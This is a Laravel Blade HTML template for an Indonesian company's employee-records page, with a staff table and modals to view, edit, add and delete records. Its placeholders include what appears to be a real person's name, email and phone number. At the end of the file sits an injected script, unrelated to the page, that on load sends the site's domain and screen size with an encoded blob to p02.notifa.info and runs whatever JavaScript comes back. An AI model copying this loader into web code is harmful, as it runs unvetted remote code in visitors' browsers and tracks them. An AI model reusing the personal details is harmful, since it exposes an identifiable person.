<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="/image/favicon.png">
    <title>Data Karyawan</title>
    <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
    <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  </head>
  <body>
    <div class="be-wrapper">
       <div class="be-wrapper be-fixed-sidebar">

            <!--  Sidebar Brand Logo -->

          <div class="be-left-sidebar">
            <div class="brand-logo">
                <img src="/image/logo.png">
            </div>

                 <!--  Sidebar Brand Logo End -->  

                  <!--  Sidebar Start -->  

            <div class="left-sidebar-wrapper"> <a href="#" class="left-sidebar-toggle">MENU</a>
             <div class="left-sidebar-spacer">
              <div class="left-sidebar-scroll">
                <div class="left-sidebar-content">

                     <!--  Sidebar Poto, Username, Edit Profil -->

                    <div class="profil">
                        <div class="circular--portrait">
                            <img class="img-responsive" src="assets/img/avatar.png">
                            <div id="username">
                                <a href="profil.html" class="simple_text">{{ Auth::user()->name }}</a>
                            </div>
                           <button onclick="window.location.href='/profil'" type="button" class="btn">Profil</button>
                           <!-- <button class="btn btn-space btn-default active">Default</button> -->
                        </div>
                    </div>

                             <!--  Sidebar Menu-->

                        <ul class="sidebar-elements">
                            <li class="divider">Menu
                                <hr class="Menu">  
                            </li>

                            <li class="active"><a href="/home">
                                <i class="icon fas fa-home"></i>
                                <span>Beranda</span></a>
                            </li>
                                                                     
                            <li class="active">
                                <a class="" href="/datakaryawan">
                                    <i class="icon far fa-address-book"></i>
                                    <span>Data Karyawan</span>
                                </a>
                            </li>

                            <li class="active">
                                <a class=" " href="/presensi">
                                  <i class="icon fas fa-calendar-alt"></i>
                                  <span>Presensi</span>
                              </a>
                            </li>

                              <li class="active">
                                <a class=" " href="/penggajian">
                                   <i class="icon fas fa-money-check-alt"></i>
                                    <span>Penggajian</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/persetujuan_izin">
                                   <i class="icon far fa-calendar-check"></i>
                                    <span>Persetujuan Izin</span>
                                </a>
                              </li>  

                              <li class="divider">Personal
                                 <hr class="Menu">  
                              </li> 

                              <li class="active">
                                <a class=" " href="/gaji">
                                  <i class="icon far fa-money-bill-alt"></i>
                                  <span>Gaji</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/kontak_karyawan">
                                    <i class="icon far fa-id-card"></i>
                                    <span>Kontak Karyawan</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/form_izin">
                                  <i class="icon fab fa-wpforms"></i>
                                  <span>Form Izin</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class="dropdown-item" href="{{ route('logout') }}"
                                       onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                        <i class="icon fas fa-sign-out-alt"></i>
                                        <span>Logout</span>
                                </a>

                                <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                                        @csrf
                                </form>
                              </li>                              
                            </ul>
                         </div>                         
                    </div>
                 </div>
               </div>
            </div>
         </div>


      <!-- Konten -->
      <div class="be-content">
        <div class="page-head">
          <h2 class="page-head-title">Data Karyawan</h2>
        </div>
        <div class="main-content container-fluid">
          <div class="row">
            <div class="col-sm-12">
              <div class="panel panel-default panel-table">
                <div class="panel-body">
                  <table id="table1" class="table table-striped table-hover table-fw-widget">
                    <thead>
                      <tr>
                        <th style="width:17%;">NIK</th>
                        <th style="width:20%;">Nama</th>
                        <th style="width:15%;"> Divisi</th>
                        <th style="width:15%;">Status</th>
                        <th style="width:15%;">Aksi</th>
                       </tr>
                    </thead>
                    <tbody>
                      @foreach($data_karyawan as $data)
                      <tr class="odd gradeA">
                        <td>{{$data->nik}}</td>
                        <td>{{$data->nama_karyawan}}</td>
                        <td>{{$data->divisi}}</td>
                        <td class="center">{{$data->status_kerja}}</td>
                        <td >
                          <a id="btn-rincian" data-toggle="modal" data-target="#rincian"
                              data-id="{{$data->nik}}" 
                              data-nama="{{$data->nama_karyawan}}" 
                              data-email="{{$data->email}}" 
                              data-divisi="{{$data->divisi}}" 
                              data-masa-kerja="{{$data->masa_kerja}}" 
                              data-alamat="{{$data->alamat}}" 
                              data-tempat-lahir="{{$data->tempat_lahir}}"
                              data-tanggal-lahir="{{$data->tanggal_lahir}}" 
                              data-no-telp="{{$data->no_telp}}"
                              data-no-ktp="{{$data->no_ktp}}"
                              data-no-npwp="{{$data->npwp}}"
                              data-telp-darurat="{{$data->no_telp_darurat}}"
                              data-hub-no-telp-darurat="{{$data->hub_no_telp_darurat}}"
                              data-status-hubungan="{{$data->status_hubungan}}"
                              data-status-kerja="{{$data->status_kerja}}"
                              data-foto-karyawan = "{{$data->foto_karyawan}}">
                          <button type="button" class="btn btn-space btn-primary"> Rincian </button>
                          </a>
                          <button data-toggle="modal" data-target="#sunting" type="button" class="btn btn-space btn-warning"> Edit </button>
                          <button data-toggle="modal" data-target="#hapus" type="button" class="btn btn-space btn-danger"> Hapus </button>
                        </td>
                      </tr>
                      @endforeach
                    </tbody>
                  </table>
                 <div id="tambahkaryawan">
                     <button data-toggle="modal" data-target="#tambah" type="button" class="btn btn-space btn-primary">Tambah Karyawan</button>
                 </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <!-- Modals untuk Rincian -->

       <div id="rincian" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
      <div class="modal-dialog custom-width">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" data-dismiss="modal" aria-hidden="true" class="close md-close"><span class="mdi mdi-close"></span></button>
            <h3 class="modal-title">Rincian Data Karyawan</h3>
          </div>
          <div class="modal-body" id="modal-rincian">
             <div class="form-group">
               <img src="assets/img/140x140.png" alt="Placeholder" class="img-thumbnail">
            </div>
             <div class="form-group">
              <label>NIK</label>
              <input type="number" value="" name="nik" id="nik" class="form-control" readonly="">
            </div>
             <div class="form-group">
              <label>Nama</label>
              <input type="text" class="form-control" readonly="">
            </div>
            <div class="form-group">
              <label>Email address</label>
              <input type="email" value="{{$data->email}}" placeholder="adinda.14115036@student.itera.ac.id" class="form-control" readonly="">
            </div>
             <div class="form-group">
              <label>Jabatan/Divisi</label>
              <input type="text" value="{{$data->divisi}}" placeholder="Tech Development" class="form-control" readonly="">
            </div>
            <div class="form-group">
              <label>Masa Kerja</label>
              <input type="text" value="{{$data->masa_kerja}}" placeholder="1 bulan 19 hari" class="form-control" readonly="">              
            </div>
             <div class="form-group">
              <label>Alamat</label>
              <input type="text" value="{{$data->Alamat}}" placeholder="Jl.Pangeran Senopati Raya no 18, Korpri Raya, Bandar Lampung" class="form-control" readonly="">
            </div>
             <div class="form-group">
              <label>Tempat Kelahiran</label>
              <input type="text" value="{{$data->tempat_lahir}}" placeholder="Dili, Timor Leste" class="form-control" readonly="">
            </div>
            <div class="row">
              <div class="form-group col-md-12">
                <label>Tanggal Lahir</label>
              </div>
            </div>
            <div class="row no-margin-y">
              <div class="form-group col-xs-3">
                <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$data->tanggal_lahir)->format('d')}}" placeholder="22" class="form-control" readonly="">
              </div>
              <div class="form-group col-xs-3">
                <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$data->tanggal_lahir)->format('M')}}" placeholder="11" class="form-control" readonly="">
              </div>
              <div class="form-group col-xs-3">
                <input type="text" value="{{DateTime::createFromFormat('Y-m-d',$data->tanggal_lahir)->format('Y')}}" placeholder="1997" class="form-control" readonly="">
              </div>
            </div>
             <div class="form-group">
              <label>No.Telepon</label>
              <input type="number" value="{{$data->no_telp}}" placeholder="085267020933" class="form-control" readonly="">
            </div>
             <div class="form-group">
              <label>No.KTP</label>
              <input type="number" value="{{$data->no_ktp}}" placeholder="8723487634567987645" class="form-control" readonly="">
            </div>
             <div class="form-group">
              <label>No.NPWP</label>
              <input type="number" value="{{$data->no_npwp}}" placeholder="59867374587457" class="form-control" readonly="">
            </div>
            <div class="form-group">
              <label>No.Telepon Darurat</label>
              <input type="number" value="{{$data->no_telp_darurat}}" placeholder="085267020922" class="form-control" readonly="">
            </div>
            <div class="form-group">
              <label>Hubungan dengan No.Telepon Darurat</label>
              <input type="text" value="{{$data->hub_no_telp_darurat}}" placeholder="-" class="form-control" readonly="">              
            </div>
            @if($data->status_hubungan == "single")
              <!-- Do Nothing -->
            @else
            <div class="form-group">
              <label>Nama Istri/Suami</label>
              <input type="text" value="{{$data->tempat_lahir}}" placeholder="-" class="form-control" readonly="">              
            </div>
            @php
              $i = 0;
            @endphp
            @while ( $i < strval($data->status_hubungan))
             <div class="form-group">
              <label>Nama Anak ke-{{$i}}</label>
              <input type="text" placeholder="-" class="form-control" readonly="">
            </div>
                @php
                  $i++;
                @endphp

            @endwhile
            @endif
             <div class="form-group">
              <label>Status</label>
              <input type="text" placeholder="Aktif" class="form-control" readonly="">
          </div>
          <div class="modal-footer">
            <button type="button" data-dismiss="modal" class="btn btn-primary md-close">Tutup</button>
          </div>
        </div>
      </div>
    </div>
  </div>
    <!--Akhir dari Modals Rincian -->


     <!-- Modals untuk Edit -->

       <div id="sunting" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
            <h3 class="modal-title">Edit Data Karyawan</h3>
          </div>
          <div class="modal-body">
           <div class="form-group">
                <img alt="foto profil" src="assets/img/140x140.png" class="img-thumbnail" /> <br> <br>
                <input type="file" id="file" onchange="return fileValidation()"/>
            </div>
             <div class="form-group">
              <label>NIK</label>
              <input type="number" placeholder="1234567098765432" class="form-control" >
            </div>
             <div class="form-group">
              <label>Nama</label>
              <input type="text" placeholder="Adinda Virguinia Ayu Permata Manihuruk" class="form-control">
            </div>
            <div class="form-group">
              <label>Email address</label>
              <input type="email" placeholder="adinda.14115036@student.itera.ac.id" class="form-control" >
            </div>
             <div class="form-group">
              <label>Jabatan/Divisi</label>
              <input type="text" placeholder="Tech Development" class="form-control" >
            </div>
            <div class="form-group">
              <label>Masa Kerja</label>
              <input type="text" placeholder="1 bulan 19 hari" class="form-control" >              
            </div>
             <div class="form-group">
              <label>Alamat</label>
              <input type="text" placeholder="Jl.Pangeran Senopati Raya no 18, Korpri Raya, Bandar Lampung" class="form-control" >
            </div>
             <div class="form-group">
              <label>Tempat Kelahiran</label>
              <input type="text" placeholder="Dili, Timor Leste" class="form-control" >
            </div>
            <div class="row">
              <div class="form-group col-md-12">
                <label>Tanggal Lahir</label>
              </div>
            </div>
            <div class="row no-margin-y">
              <div class="form-group col-xs-3">
                <input type="text" placeholder="22" class="form-control" >
              </div>
              <div class="form-group col-xs-3">
                <input type="text" placeholder="11" class="form-control" >
              </div>
              <div class="form-group col-xs-3">
                <input type="text" placeholder="1997" class="form-control">
              </div>
            </div>
             <div class="form-group">
              <label>No.Telepon</label>
              <input type="number" placeholder="085267020933" class="form-control">
            </div>
             <div class="form-group">
              <label>No.KTP</label>
              <input type="number" placeholder="8723487634567987645" class="form-control">
            </div>
             <div class="form-group">
              <label>No.NPWP</label>
              <input type="number" placeholder="59867374587457" class="form-control" >
            </div>
            <div class="form-group">
              <label>No.Telepon Darurat</label>
              <input type="number" placeholder="085267020922" class="form-control" >
            </div>
              <div class="form-group">
              <label>Hubungan dengan No.Telepon Darurat</label>
              <input type="text" placeholder="-" class="form-control" >              
            </div>
            <div class="form-group">
              <label>Nama Istri/Suami</label>
              <input type="text" placeholder="-" class="form-control">              
            </div>
             <div class="form-group">
              <label>Nama Anak ke-1</label>
              <input type="text" placeholder="-" class="form-control">              
            </div>
             <div class="form-group">
              <label>Nama Anak ke-2</label>
              <input type="text" placeholder="-" class="form-control">              
            </div>
             <div class="form-group">
              <label>Nama Anak ke-3</label>
              <input type="text" placeholder="-" class="form-control">              
            </div>
             <div class="form-group">
              <label>Nama Anak ke-4</label>
              <input type="text" placeholder="-" class="form-control">              
            </div>
            <div class="form-group">
              <label>Status</label>
              <select name="status" id="status" class="form-control">
                  <option value="">-Pilih-</option>
                  <option value="Aktif">Aktif</option>
                  <option value="Resign" >Resign</option>
              </select> 
          </div>
          <div class="form-group">
            <label>Alasan</label>
            <input id="alasan" type="text" disabled="" class="form-control">            
          </div>
          <div class="form-group">
            <label>Tanggal Resign</label>
            <input id="tgl_resign" type="date" class="form-control" disabled="">
          </div>
          </div>
          <div class="modal-footer">
            <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
            <button type="button" data-dismiss="modal" class="btn btn-primary">Simpan perubahan</button>
          </div>
        </div>
      </div>
    </div>
  
    <!-- Modals untuk Hapus -->

        <div id="hapus" tabindex="-1" role="dialog" class="modal fade">
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
          </div>
          <div class="modal-body">
            <div class="text-center">
              <div class="text-danger"><span class="modal-main-icon mdi mdi-close-circle-o"></span></div>
              <h3>Apakah Anda yakin untuk menghapus data</h3>
              <p><font size="4">Adinda Virguinia Ayu Permata Manihuruk ?</font> <br><br>
              (* Data yang telah dihapus tidak dapat dikembalikan)</p>
              <div class="xs-mt-50">
                <button type="button" data-dismiss="modal" class="btn btn-space btn-default">Batal</button>
                <button type="button" data-dismiss="modal" class="btn btn-space btn-danger">Hapus</button>
              </div>
            </div>
          </div>
          <div class="modal-footer"></div>
        </div>
      </div>
    </div>
    <!--Akhir dari Modals Hapus -->

    
 <!-- Modals untuk Tambah Karyawan -->

       <div id="tambah" tabindex="-1" role="dialog" class="modal fade colored-header colored-header-primary">
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
            <h3 class="modal-title">Tambah Data Karyawan</h3>
          </div>
          <div class="modal-body">
           <div class="form-group">
                <img alt="foto profil" src="assets/img/140x140.png" class="img-thumbnail" /> <br> <br>
                <input type="file" id="file" onchange="return fileValidation()"/>
            </div>
              <div class="form-group">
              <label>NIK</label>
              <input type="number" class="form-control">
            </div>
             <div class="form-group">
              <label>Nama</label>
              <input type="text" class="form-control">
            </div>
            <div class="form-group">
              <label>Email address</label>
              <input type="email" class="form-control">
            </div>
             <div class="form-group">
              <label>Jabatan/Divisi</label>
              <input type="text" class="form-control">
            </div>
            <div class="form-group">
              <label>Masa Kerja</label>
              <input type="text" class="form-control" >              
            </div>
             <div class="form-group">
              <label>Alamat</label>
              <input type="text" class="form-control" >
            </div>
             <div class="form-group">
              <label>Tempat Kelahiran</label>
              <input type="text" class="form-control">
            </div>
            <div class="row">
              <div class="form-group col-md-12">
                <label>Tanggal Lahir</label>
              </div>
            </div>
            <div class="row no-margin-y">
              <div class="form-group col-xs-3">
                <input type="text"  class="form-control" >
              </div>
              <div class="form-group col-xs-3">
                <input type="text"  class="form-control">
              </div>
              <div class="form-group col-xs-3">
                <input type="text" class="form-control">
              </div>
            </div>
             <div class="form-group">
              <label>No.Telepon</label>
              <input type="number"  class="form-control" >
            </div>
             <div class="form-group">
              <label>No.KTP</label>
              <input type="number"  class="form-control" >
            </div>
             <div class="form-group">
              <label>No.NPWP</label>
              <input type="number"  class="form-control">
            </div>
            <div class="form-group">
              <label>No.Telepon Darurat</label>
              <input type="number"  class="form-control" >
            </div>
             <div class="form-group">
              <label>Hubungan dengan No.Telepon Darurat</label>
              <input type="text" placeholder="-" class="form-control">              
            </div>
            <div class="form-group">
              <label>Nama Istri/Suami</label>
              <input type="text" class="form-control" >              
            </div>
             <div class="form-group">
              <label>Nama Anak ke-1</label>
              <input type="text"  class="form-control">              
            </div>
             <div class="form-group">
              <label>Nama Anak ke-2</label>
              <input type="text"  class="form-control" >              
            </div>
            <div class="form-group">
              <label>Nama Anak ke-3</label>
              <input type="text"  class="form-control">              
            </div>
             <div class="form-group">
              <label>Nama Anak ke-4</label>
              <input type="text"  class="form-control" >              
            </div>
            <div class="form-group">
              <label>Status</label>
              <select name="status" id="status" class="form-control" required="" >
                  <option value="">-Pilih-</option>
                  <option value="">Aktif</option>
                  <option >
                    <button data-toggle="modal" data-target="#resign" type="button" class="btn btn-space btn-danger"> Resign </button> 
                  </option>
              </select> 
          </div>
          </div>
          <div class="modal-footer">
            <button type="button" data-dismiss="modal" class="btn btn-default">Batal</button>
            <button type="button" data-dismiss="modal" class="btn btn-primary">Simpan</button>
          </div>
        </div>
      </div>
    </div> 
    <!--Akhir dari Modals Tambah Karyawan -->

     <div class="text-center">
      <div class="credits">
        <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
      </div>
      </div>
</div>

    <script type="text/javascript">
     // Here we are hiding Modal To show Initially
      $(document).on("click", "#btn-rincian", function() {
          var nik                 = $(this).data('nik');
          var nama_karyawan       = $(this).data('nama_karyawan');
          var email               = $(this).data('email')
          var divisi              = $(this).data('divisi');
          var masa_kerja          = $(this).data('masa_kerja');
          var alamat              = $(this).data('alamat');
          var tempat_lahir        = $(this).data('tempat_lahir');
          var tanggal_lahir       = $(this).data('tanggal_lahir');
          var no_telp             = $(this).data('no_telp');
          var no_ktp              = $(this).data('no_ktp');
          var npwn                = $(this).data('npwn');
          var no_telp_darurat     = $(this).data('no_telp_darurat');
          var hub_no_telp_darurat = $(this).data('hub_no_telp_darurat');
          var status_hubungan     = $(this).data('status_hubungan');
          var status_kerja        = $(this).data('status_kerja');
          var foto_karyawan       = $(this).data('foto_karyawan');
          $("#modal-rincian #nik").val(nik);
            
      });

    </script>

    <!-- JS untuk opsi resign di bagian edit data karyawan -->
    <script type="text/javascript">
          
          $(function(){
          $('a#logout').click(function(){
              if(confirm('Apakah anda yakin ingin keluar ?')) {
                  return true;
              }

              return false;
                });
            });

    </script>

    <script type="text/javascript">
            
      // Fungsi Menu dashboard

      $(document).ready(function(){

          App.init();
          App.dashboard();

          });

    </script>

    <script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
    <script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
    <script src="assets/js/main.js" type="text/javascript"></script>
    <script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
    <script src="assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>

    <script type="text/javascript">
      $(document).ready(function(){
        //initialize the javascript
        App.init();
        App.dataTables();
      });
    </script>

    <script type="text/javascript">
      document.getElementById("status").onchange = function () {
      document.getElementById("alasan").setAttribute("disabled", "disabled");
       document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
      if (this.value == 'Resign')
        document.getElementById("alasan").removeAttribute("disabled");
      if (this.value == 'Resign')
      document.getElementById("tgl_resign").removeAttribute("disabled");
      };

    </script>

    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };

    </script>

</body>
</html>
